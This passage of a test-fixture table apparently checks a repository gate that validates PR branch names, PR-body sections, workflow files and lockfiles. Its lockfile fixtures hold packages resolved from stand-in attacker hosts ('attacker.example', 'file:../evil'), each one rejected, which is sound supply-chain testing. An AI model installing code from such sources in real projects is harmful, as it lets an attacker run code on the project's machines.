        ((('PR_HEAD_REF', 'chore/foo/bar'),), ('scripts/gate/helper.py',), 'ce9defe90fb993369b8d55a9243f13d0f091871aad4f53d527c9d51fabf6184c', None, 0, (), 1, (" - branch 'chore/foo/bar' changes 1 gated file(s) (scripts/gate/helper.py) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/Bad'),), ('scripts/gate/helper.py',), '2b77975f1513188c38e113ae7c027fb15ec80cb71324655bea7e50ae4ed5cab0', None, 0, (), 1, (" - branch 'chore/Bad' changes 1 gated file(s) (scripts/gate/helper.py) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-x/y'),), ('scripts/gate/helper.py',), '0c052836cc82fadba32411840ac3c4a417a45cb5913d2444c1d6334a6fc70ab3', None, 0, (), 1, (" - branch 'bot/superpowers-x/y' changes 1 gated file(s) (scripts/gate/helper.py) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/brainstorming/SKILL.md',), 'ada973ec360acc2b70f3ef009348aeb9e828ac103629e92332a2be70540650c4', None, 0, (), 0, ()),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/product-delivery/SKILL.md',), 'da65df0de0d3f15df345178adf146c75b6e291bcb54b2eaa59bbdf95737576ac', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/product-delivery/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'main'),), ('docs/notes.md',), '4f42053467dc0a0ae18a1695b9982b215d4243165d4a5f05e2338357c68bf9ac', None, 0, (), 1, (" - branch 'main' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
        ((('PR_HEAD_REF', 'typo'),), ('docs/notes.md',), '39967100e90470cc4bb2f37e4be4253348e0550c4ff18e3869922e410c659bd8', None, 0, (), 1, (" - branch 'typo' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
        ((('PR_HEAD_REF', 'claude/notes'),), ('docs/notes.md',), '991eb9000a8458635c022b52cab94961c7ac30d1a1819907ec9b8baea1bb6fe1', None, 0, (), 1, (" - branch 'claude/notes' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
        ((('PR_HEAD_REF', 'feature/typo'),), ('docs/notes.md',), 'b47752e9473eeff91416bd77b11f44b47e81af69362bfad7944e12aa2c036292', None, 0, (), 1, (" - branch 'feature/typo' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
        ((('PR_HEAD_REF', 'fix/wrong'),), ('docs/notes.md',), '826fd1bdec7a6129e561ef316089afdb834607682afe42841ee330784f3f14fe', None, 0, (), 1, (" - branch 'fix/wrong' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
        ((('PR_HEAD_REF', 'docs/Bad_Name'),), ('docs/notes.md',), 'd520093cefec0e98775f34a0497fd0351b96c742b36fab8e5dd4bd5c61e6cc45', None, 0, (), 1, (" - branch 'docs/Bad_Name' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-a_b'),), ('docs/notes.md',), 'e7b8530ff5a4919b8f4166be6dae6c14ce3fc652041affa8a466fc52317f4656', None, 0, (), 1, (" - branch 'feature/feat-model-001-a_b' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
        ((('PR_HEAD_REF', 'fix/feat-model-001-a.b'),), ('docs/notes.md',), 'e1cef4264e6c625884aa8b3d5560de793bf8217d7fe935de46990caff05d533b', None, 0, (), 1, (" - branch 'fix/feat-model-001-a.b' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
        ((('PR_HEAD_REF', 'docs/notes'),), ('docs/notes.md',), '67f60b3e70fff3ca94946aba41667a1ca925e198d5d7c3ea5780f634b240a307', None, 0, (), 0, ()),
        ((('PR_DRAFT', 'false'), ('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_NUMBER', '42'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/02-FEATURE-CATALOG.md',), '9cc08bee1bcaed0ca9a4a551b913d66445cfb734fe5f4caa0b7256adc5c1700e', '3b4f7f730d2478256a1a38710b7a61cb46b7e9ef8671a9e7eba514fa781f8e34', 0, (), 1, (" - docs/superpowers/plans/2026-09-01-model-decisions.md: set the plan's pr to 42 before marking the PR ready",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'),), ('docs/product/02-FEATURE-CATALOG.md',), '9cc08bee1bcaed0ca9a4a551b913d66445cfb734fe5f4caa0b7256adc5c1700e', None, 0, (), 1, (" - no plan in docs/superpowers/plans names branch 'feature/feat-model-001-model-decisions'",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/ci.yml', 'lib/model.py'), 'd21a7b14eb51088cbda8403ec26b5d207e8e20bbcf9e46595ad00d577be083f2', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - process change(s) (.github/workflows/ci.yml) belong to FEAT-CICD-001, not FEAT-MODEL-001; CI configuration, the gate and the agent instructions are that capability's work",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/ci.yml', 'lib/model.py'), 'd21a7b14eb51088cbda8403ec26b5d207e8e20bbcf9e46595ad00d577be083f2', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'docs/tweak'),), ('AGENTS.md',), '140283191b249eb55f902669754fdb675720276303b2630d2c402844d6fada12', None, 0, (), 1, (" - branch 'docs/tweak' changes 1 gated file(s) (AGENTS.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'docs/tweak'),), ('CLAUDE.md',), '3e3f424cfbea900869edc82afeac0a1f35575d66b56bef789bee0d898558b77b', None, 0, (), 1, (" - branch 'docs/tweak' changes 1 gated file(s) (CLAUDE.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'docs/skill-tweak'),), ('.claude/skills/product-delivery/SKILL.md',), 'cc0b2f8e3f684e3507f173883bcb67d06644e9b2b8e028e7136767f688c24d9b', None, 0, (), 1, (" - branch 'docs/skill-tweak' changes 1 gated file(s) (.claude/skills/product-delivery/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'docs/workflow-notes'),), ('.github/workflows/README.md', 'gcp/README.md'), '08bcd199b78bd84384bda2dafbcc09d0e5e4bf85c50441e2bc3effb74db3a7e8', 'db48a9197010e0debbf2c745beaa8cad35619c4485ebebad48ebd7e6322bbd7a', 0, (), 0, ()),
    ),
    'test_the_pr_body_contract_is_read_as_rendered_in_every_form': (
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '91a983430bdbb98626ba67e8e5b1e6b9c877cd2b1042e6f301738160ed2fe49a', 0, (), 1, (' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md')),
        ((('PR_DRAFT', 'false'), ('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_NUMBER', '42'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/02-FEATURE-CATALOG.md', 'docs/superpowers/plans/2026-09-01-model-decisions.md', 'lib/model.py'), '2b22f1d0861051407302d30782af37f0d1b9ed6c5c09ceda58a052a9765fe41e', '5c806a56aeaedddf4f01fab9333cb081a541044af811e2526a4584da3b44e605', 0, (), 1, (' - ready for review with done_when item(s) not ticked: every model states its decision; the registry test passes',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'a0b202e0b1af1b099ed9398a0e0c89077a43279c6c1195ea9fe70929cfe554e7', 0, ('$0.01',), 1, (" - PR body's Capacity section leaves Volume blank; give the numbers, or write 'n/a: <why no workload runs differently>'",)),
    ),
    'test_capacity_values_are_numbers': (
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '50f7fa8981ef8a80c6164f3e589310ea385a0ac87c6fa2c3dc5498a7e7688e76', 0, ('TBD',), 1, (" - PR body's Capacity section gives no number for Volume, Velocity, Wall-clock, 30; each value starts with its figure (rows, calls, seconds, dollars), or the section says 'n/a: <why no workload runs differently>'",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '00946b25d43152c3ee03fd2d8b63b8fdb92bcb013ddc338d571d26d3a49aea12', 0, ('$0.01',), 1, (" - PR body's Capacity section gives no number for Velocity; each value starts with its figure (rows, calls, seconds, dollars), or the section says 'n/a: <why no workload runs differently>'",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'bee90077581ea6817dc276e742ad782ee1b2040cb5cdeaee6658cfa6bd6c330a', 0, ('$0.01',), 0, ()),
    ),
    'test_contract_commands_run_and_policy_documents_keep_their_ids': (
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), 'f022247207ce3536cb8f26bb031e9c945144f689c59fcf9a66e11f83cf65de77', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '5197d58425caa7b7a0e5933f49e69eb080e5bacc7a6ee3ff7d9347cf3446ead8', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), 'e4586250d4b114cc39f9088488eae5b3f9a840542d407e280f3d1f9c807872c6', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '1c72d50e517c4685ef59c02cd87d149f0ff9148e61b511ad37624da1625b7946', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), 'e3f4acbd7df5561b786928e0ab2a0ddc385de2e306adad749449f8ce5696af76', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), 'ed82e4a4c7ef2af589ea79ed5f166342efb620d6a37e415189306c8abeadb817', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), '5a817fb579a5f755f11be34d7f1db7487224d0828eb919a8ac7868c3c83ae6bd', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: the table no longer carries the PRs column the close-out reads; the catalog's columns keep their names", " - docs/product/02-FEATURE-CATALOG.md: FEAT-DATA-001 no longer carries the Status, Last reviewed field(s) the close-out reads; the catalog's columns and record fields keep their names", ' - docs/product/02-FEATURE-CATALOG.md: no longer defines 2 ID(s) the base has (FEAT-DATA-001 and more); a policy document is extended in a branch, never emptied or pruned')),
        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), '88c81548c93fe3919b7526ab2ad2763b4d3c661470a000d17e60a81db72aabe6', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: the table no longer carries the PRs column the close-out reads; the catalog's columns keep their names", " - docs/product/02-FEATURE-CATALOG.md: FEAT-DATA-001 no longer carries the Status, Last reviewed field(s) the close-out reads; the catalog's columns and record fields keep their names", ' - docs/product/02-FEATURE-CATALOG.md: no longer defines 2 ID(s) the base has (FEAT-DATA-001 and more); a policy document is extended in a branch, never emptied or pruned')),
        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/01-PRODUCT-REQUIREMENTS.md',), 'a804256d403844f526e25ef9cf82d494bb9ca6170a088dbd38deca93aaaaf3cb', None, 0, (), 1, (' - docs/product/01-PRODUCT-REQUIREMENTS.md: no longer defines 2 ID(s) the base has (REQ-DATA-001 and more); a policy document is extended in a branch, never emptied or pruned',)),
        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), 'c81470e30f6c7d9e6062ed384194a1f688a0313abd800e2d036eea2daa528ebb', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: FEAT-DATA-001 no longer carries the Status, Last reviewed field(s) the close-out reads; the catalog's columns and record fields keep their names", ' - docs/product/02-FEATURE-CATALOG.md: no longer defines 1 ID(s) the base has (FEAT-DATA-001); a policy document is extended in a branch, never emptied or pruned')),
        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), '557366fe6473f007e5da635a427ce27e87708a3f4a0c67219328f9627cd3152c', None, 0, (), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'e7483541f0f50a0a8e4ba458a4399ad1a5db663143701c2a626d4dbcdfb1bf18', 0, ('$0.01',), 1, (" - PR body's Capacity section gives no number for Volume, Velocity, Wall-clock; each value starts with its figure (rows, calls, seconds, dollars), or the section says 'n/a: <why no workload runs differently>'",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '8c29f4efa3cef689ba8e5bca9c80e6ee0ce4dda675eb28a15b2ca028e74f94ed', 0, ('$0.01',), 0, ()),
    ),
    'test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contract': (
        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), '400dce939e927914e2db364414b479fbe5fd20feec9499e44cf23220b0f96c13', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'https://attacker.example/lodash-4.17.21.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), 'ea5fe23049730981ba73172507b00855e160c79eeed3ef94b50c90d16c117e01', None, 0, (), 0, ()),
        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), 'f64a220e03ef123d5836f3a9a04885164eaedd8df01645df93218b111cd2bc89', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'https://HTTPS://attacker.example/lodash-4.17.21.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), '400dce939e927914e2db364414b479fbe5fd20feec9499e44cf23220b0f96c13', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'https://attacker.example/lodash-4.17.21.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), 'bdc185d6baf71e0c4fe3c770c360731373dab12b9982c423a1e0a7851b02ba3c', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'https://attacker.example/lodash-4.17.21.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), 'daf2537fc665f4a986230eb70493c4c8faa5b55b9bc107fee212724aa649b5a7', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'file:../evil'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), '73e0a9338e13c46e1d79ae9604184a6453df38356dba52808a34134d969a6008', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from '//attacker.example/l.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/bump'),), ('uv.lock',), '8af6e73af3e7a5ef18a79827a6a11dd2d50a3960cc5b5b07b7788b88884da04c', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (uv.lock) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - uv.lock: resolves a package from 'source:editable'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/bump'),), ('uv.lock',), '79a6d0091e39cc2debc8678b7d17edc32217ace6142e7d02d6306c50de1ca6c8', None, 0, (), 0, ()),
        ((('PR_HEAD_REF', 'chore/bump'),), ('poetry.lock',), '7d974ee3bd8d7e0f9cf1d34fe9c62642ac426f85155c19e31c25c115a7dc63ba', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (poetry.lock) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - poetry.lock: resolves a package from 'source:type,url'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/spec-gate2.yml', 'lib/model.py'), 'c135c15b5b73fa8688b594f9f9adb982d7bf07ac095aa6707a2473d2fcd6ac1c', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - .github/workflows/spec-gate2.yml: takes the name or a job key of .github/workflows/spec-gate.yml (spec-gate); a required check's name belongs to the gate's workflow alone",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/Spec-Gate.yml', 'lib/model.py'), 'f1e28b70462c0bd54992b135b17558248f5fbe19eee8ff6a84f239b7246a17a9', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - .github/workflows/Spec-Gate.yml: takes the name or a job key of .github/workflows/spec-gate.yml (spec-gate); a required check's name belongs to the gate's workflow alone",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/rc2.yml', 'lib/model.py'), 'e507a66093455ea968ef4612b434259cf9842bede262af1bd10b1f8bb1cec7f9', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - .github/workflows/rc2.yml: takes the name or a job key of .github/workflows/spec-gate.yml (spec-gate); a required check's name belongs to the gate's workflow alone",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/rc2.yml',), '6c2f2e6c81ebce1c46ff6db831cd3f40c329860aa53a23108f1111182ddb4a43', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/rc2.yml: takes the name or a job key of .github/workflows/registry-check.yml (registry-check); a required check's name belongs to the gate's workflow alone",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('scripts/gate/pinned/spec-gate.yml',), 'b183555000a49f70d021d088b0d396cc0ee99f22d806c7b8714a06967f2efdb7', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - scripts/gate/pinned/spec-gate.yml: is not valid YAML (while parsing a flow sequence); GitHub would not load the workflow and every later PR would lose the gate',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('scripts/gate/pinned/spec-gate.yml',), 'f0e9d11f5544b52de709153cd5d1eda42fca5b9c550646f9784e4243a1573d14', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - scripts/gate/pinned/spec-gate.yml: grants a write permission (contents: write); the gate's workflows run head-controlled code on a read-only token, at the top level and in every job",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py', 'scripts/gate/pinned/spec-gate.yml'), 'db61c55ba29ff89ff050c1e49e35d8e578469c3284f5e84f0bc8985ce4565881', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - process change(s) (scripts/gate/pinned/spec-gate.yml) belong to FEAT-CICD-001, not FEAT-MODEL-001; CI configuration, the gate and the agent instructions are that capability's work",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.claude/skills/product-delivery/SKILL.md', 'lib/model.py'), '7519511b17400921aa5b754f1ce9324cb74bf77e0d2d2ce473058f60ef4fd9b8', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - process change(s) (.claude/skills/product-delivery/SKILL.md) belong to FEAT-CICD-001, not FEAT-MODEL-001; CI configuration, the gate and the agent instructions are that capability's work",)),
        ((('PR_HEAD_REF', 'chore/gate-hook'),), ('scripts/gate/pinned/pre-commit',), 'a168824ba51198fcf456c7ebe1fabbda7b0348f2e5dffaf63774f3f4f26f1ea3', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - scripts/gate/pinned/pre-commit: line 'git reset -q' is not one the hook may carry; the hook checks the Python version, refuses unstaged gate edits and calls the gate, nothing else",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '32836c0c5d50e21ef91ae99de3a93b20e1bb23af7e2388366f77bb7082e00622', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: puts a comment where a value goes (permissions: #); the gate's workflows write the value or nothing; GitHub would not load the workflow and every later PR would lose the gate",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'c9b8c5186b099034a99686193ef9216a4cb2b6a2b9c22d0c1b6ac63aa95350f0', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: uses YAML's explicit-key syntax (`? key`); the gate's workflows write `key:`; GitHub would not load the workflow and every later PR would lose the gate",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '68194e07f72ff5cadd2d68584b6dcd3276e426ad26334f632c2c17692acaedfc', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: spells the trigger key as a boolean; the gate's workflows write `on:`; GitHub would not load the workflow and every later PR would lose the gate",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'e03e634f07afe16e4bbff034e9ad3533f687b282e75510cae3b7aa2c76c37824', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: checkout step sets `github-server-url`; the gate's checkouts set ref, fetch-depth and persist-credentials only; the gate's workflows check out the side the contract names",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), None, None, '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: differs from its pinned copy scripts/gate/pinned/spec-gate.yml on the base; change the pinned copy in its own PR first, then make the file equal to it. A gate workflow or hook is never edited freely',)),
